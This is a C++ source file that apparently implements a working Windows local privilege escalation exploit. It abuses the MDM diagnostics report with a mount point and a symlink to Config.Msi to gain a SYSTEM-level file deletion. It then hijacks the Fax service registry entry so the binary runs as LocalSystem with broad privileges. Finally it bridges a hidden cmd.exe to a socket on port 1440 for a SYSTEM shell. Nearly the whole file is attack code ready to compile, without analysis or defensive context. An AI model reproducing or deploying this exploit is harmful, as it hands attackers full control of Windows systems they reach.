// WindowsMDMLPE.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "ReverseShellServer.h"
#include <iostream>
#include <Windows.h>
#include "Win-Ops-Master.h"
#include "FileDeleteToSystem.h"
#pragma warning(disable : 4995)
#pragma warning(disable : 4996)
#define SERVICE_NAME  L"Fax" 
#define MAX_PATH_BUFFER 300
#define MAX_BUFFER	4096

OpsMaster op;
//declare a global structure (type SERVICE_STATUS ) that will describes the status of the service : running , stopped etc
SERVICE_STATUS g_ServiceStatus = { 0 };
//declare a global variable that will serve as reference of our service instance 
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE  g_ServiceStopEvent = INVALID_HANDLE_VALUE;

typedef HANDLE PIPE;
bool _running;
typedef struct mHandles
{
    mHandles(SOCKET& _sock, HANDLE& _pipe) :sock(_sock), pipe(_pipe) {};
    SOCKET& sock;
    HANDLE& pipe;
};
struct thread_argv {
    HANDLE hevent;
    std::wstring target;
};
void StartFaxSvc() {
    SC_HANDLE sc_h = OpenSCManager(NULL, NULL, GENERIC_READ);
    SC_HANDLE faxsvc_h = OpenServiceW(sc_h, L"Fax", SERVICE_START | SERVICE_QUERY_STATUS);
    StartService(faxsvc_h, NULL, NULL);
    return;
}

void readFromSocket2(mHandles& handleStruct)
{
    int bytesReadFromSock;
    int iResult;
    DWORD bytesReadFromPipe;
    char outBuffer[MAX_BUFFER];
    while (true)
    {
        bytesReadFromSock = recv(handleStruct.sock, outBuffer, sizeof(outBuffer), 0);
        if (bytesReadFromSock == -1)
        {
            _running = false;
            closesocket(handleStruct.sock);
            return;
        }
        outBuffer[bytesReadFromSock] = '\0';
        if (_stricmp("exit\n", outBuffer) == 0)
        {
            _running = false;
            closesocket(handleStruct.sock);
            return;
        }
        WriteFile(handleStruct.pipe, outBuffer, bytesReadFromSock, &bytesReadFromPipe, NULL);
    }
}
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{

    Sleep(200); //Give time to RemoteShellServer to set-up the server socket

    //Socket Setup
    SOCKADDR_IN server;
    SOCKET sockClient;
    WSADATA wsaData;
    //char inputUser[MAX_INPUT_BUFFER];
    int iResult;
    unsigned short port = 1440;


    WSAStartup(MAKEWORD(2, 2), &wsaData);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(port);
    sockClient = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    iResult = connect(sockClient, (SOCKADDR*)&server, sizeof(SOCKADDR_IN));
    if (iResult == SOCKET_ERROR)
        return 1;

    //Process Setup
    SECURITY_ATTRIBUTES secAttrs;
    STARTUPINFOA sInfo = { 0 };
    PROCESS_INFORMATION pInfo = { 0 };
    PIPE pipeInWrite, pipeInRead, pipeOutWrite, pipeOutRead;
    char cmdPath[MAX_PATH_BUFFER];
    char outBuffer[MAX_BUFFER];
    DWORD bytesReadFromPipe;

    secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
    secAttrs.bInheritHandle = TRUE;
    secAttrs.lpSecurityDescriptor = NULL;

    CreatePipe(&pipeInWrite, &pipeInRead, &secAttrs, 0);
    CreatePipe(&pipeOutWrite, &pipeOutRead, &secAttrs, 0);
    GetEnvironmentVariableA("ComSpec", cmdPath, sizeof(cmdPath));

    sInfo.cb = sizeof(STARTUPINFO);
    sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    sInfo.wShowWindow = SW_HIDE;
    sInfo.hStdInput = pipeOutWrite;
    sInfo.hStdOutput = pipeInRead;
    sInfo.hStdError = pipeInRead;

    CreateProcessA(NULL, cmdPath, &secAttrs, &secAttrs, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
    mHandles handles = { sockClient, pipeOutRead };

    CreateThread(&secAttrs, NULL, (LPTHREAD_START_ROUTINE)readFromSocket2, &handles, NULL, NULL);
    _running = true;
    while (sockClient != SOCKET_ERROR && _running == true)
    {
        memset(outBuffer, 0, sizeof(outBuffer));
        PeekNamedPipe(pipeInWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
        while (bytesReadFromPipe)
        {
            if (!ReadFile(pipeInWrite, outBuffer, sizeof(outBuffer), &bytesReadFromPipe, NULL))
                break;
            else
            {
                send(sockClient, outBuffer, bytesReadFromPipe, NULL);
            }
            PeekNamedPipe(pipeInWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
        }
    }

    closesocket(sockClient);
    TerminateProcess(pInfo.hProcess, 0);
    return ERROR_SUCCESS;
}
VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:

        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        /*
         * Perform tasks necessary to stop the service here
         */

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;

        if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
        {

        }

        // This will signal the worker thread to start shutting down
        SetEvent(g_ServiceStopEvent);

        break;

    default:
        break;
    }
}
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    DWORD Status = E_FAIL;
    //service registration 
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (g_StatusHandle == NULL)
    {
        return;
    }

    // notify the service controll : we are starting 
    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
    {

    }

    /*
     * Perform tasks necessary to start the service here
     */


    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL)
    {
        // Error creating event
        // Tell service controller we are stopped andmake a clean exit
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        g_ServiceStatus.dwCheckPoint = 1;

        if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
        {
            //error
        }
        return;
    }

    // Tell the service controller we are started
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
    {
        //error
    }

    // Start a thread that will perform the main task of the service
    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

    // Wait until our worker thread exits signaling that the service needs to stop
    WaitForSingleObject(hThread, INFINITE);


    /*
     * Perform any cleanup tasks
     */

    CloseHandle(g_ServiceStopEvent);

    // Tell the service controller we are stopped
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
    {

    }

}
void RunAsSvc() {

    //we need to call StartServiceCtrlDispatcher so the service control manager call the service main function
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        {(LPWSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };
    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
    {
        return;
    }

}

int main()
{
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if (argc == 2) {
        if (_wcsicmp(L"/svc", argv[1]) == 0) {
            RunAsSvc();
            return 0;
        }
    }
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    FileDeleteToSystem fdts;
    if (!fdts.PrepForExploit()) {
        printf("[-] Failed To Prepare for exploit");
        return 1;
    }
    op.RRemoveDirectory(L"C:\\Users\\Public\\Documents\\MDMDiagnostics");
    op.CreateMountPoint(L"C:\\Users\\Public\\Documents\\MDMDiagnostics", L"\\BaseNamedObjects\\Restricted");
    HANDLE sm = op.CreateNativeSymlink(L"\\BaseNamedObjects\\Restricted\\MDMDiagReport.cab", L"\\??\\C:\\Config.Msi::$INDEX_ALLOCATION");
    system("start ms-settings:workplace");
    while (GetFileAttributes(L"C:\\Config.Msi") != INVALID_FILE_ATTRIBUTES) { Sleep(500); }
    fdts.RunExploit();
    op.RRemoveDirectory(L"C:\\Users\\Public\\Documents\\MDMDiagnostics");
    CloseHandle(sm);
    HANDLE fax_reg = op.RegCreateKeyNative("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Fax", KEY_WRITE | KEY_WOW64_64KEY);
    if (!fax_reg) {
        printf("[-] Exploit Failed");
        return 1;
    }
    wchar_t exe_path[MAX_PATH];
    ///
    /// Write to the service registry
    ///
    GetModuleFileName(GetModuleHandle(NULL), exe_path, MAX_PATH);
    std::wstring target_svc = exe_path;
    target_svc.append(L" /svc");//append the command line
    memcpy(exe_path, target_svc.c_str(), MAX_PATH);
    exe_path[target_svc.size()] = '\0';
    //set the service commandline
    RegSetValueEx((HKEY)fax_reg, L"ImagePath", NULL, REG_EXPAND_SZ, (LPBYTE)exe_path,
        target_svc.size() * sizeof(WCHAR));
    //set service account
    RegSetValueEx((HKEY)fax_reg, L"ObjectName", NULL, REG_EXPAND_SZ, (LPBYTE)L"LocalSystem", lstrlenW(L"LocalSystem") * 2);
    //register default description
    RegSetValueEx((HKEY)fax_reg, L"Description", NULL, REG_SZ, (LPBYTE)L"@%systemroot%\\system32\\fxsresm.dll,-122",
        lstrlenW(L"@%systemroot%\\system32\\fxsresm.dll,-122") * 2);
    //register default displayname
    RegSetValueEx((HKEY)fax_reg, L"DisplayName", NULL, REG_SZ, (LPBYTE)L"@%systemroot%\\system32\\fxsresm.dll,-118",
        lstrlenW(L"@%systemroot%\\system32\\fxsresm.dll,-118") * 2);
    //not required, but must be set
    DWORD parameter = 1;
    RegSetValueEx((HKEY)fax_reg, L"ErrorControl", NULL, REG_DWORD, (LPBYTE)&parameter,
        sizeof(DWORD));
    //some other parameters
    parameter = 3;
    RegSetValueEx((HKEY)fax_reg, L"Start", NULL, REG_DWORD, (LPBYTE)&parameter,
        sizeof(DWORD));
    parameter = 16;
    RegSetValueEx((HKEY)fax_reg, L"Type", NULL, REG_DWORD, (LPBYTE)&parameter,
        sizeof(DWORD));
    wchar_t requiredpriv[] = L"SeTcbPrivilege\0"
        L"SeCreatePagefilePrivilege\0"
        L"SeLockMemoryPrivilege\0"
        L"SeIncreaseBasePriorityPrivilege\0"
        L"SeCreatePermanentPrivilege\0"
        L"SeAuditPrivilege\0"
        L"SeSecurityPrivilege\0"
        L"SeChangeNotifyPrivilege\0"
        L"SeProfileSingleProcessPrivilege\0"
        L"SeImpersonatePrivilege\0"
        L"SeCreateGlobalPrivilege\0"
        L"SeAssignPrimaryTokenPrivilege\0"
        L"SeRestorePrivilege\0"
        L"SeIncreaseQuotaPrivilege\0"
        L"SeShutdownPrivilege\0"
        L"SeTakeOwnershipPrivilege\0"
        L"SeLoadDriverPrivilege\0"
        L"SeBackupPrivilege\0"
        L"SeCreateSymbolicLinkPrivilege\0";
    RegSetValueEx((HKEY)fax_reg, L"RequiredPrivileges", NULL, REG_MULTI_SZ, (LPBYTE)requiredpriv,
        452 * sizeof(WCHAR));
    RegDeleteValue((HKEY)fax_reg, L"DependOnService");
    RegDeleteValue((HKEY)fax_reg, L"ServiceSidType");

    CloseHandle(fax_reg);
    StartFaxSvc();
    SpawnShell();

    return 0;
}
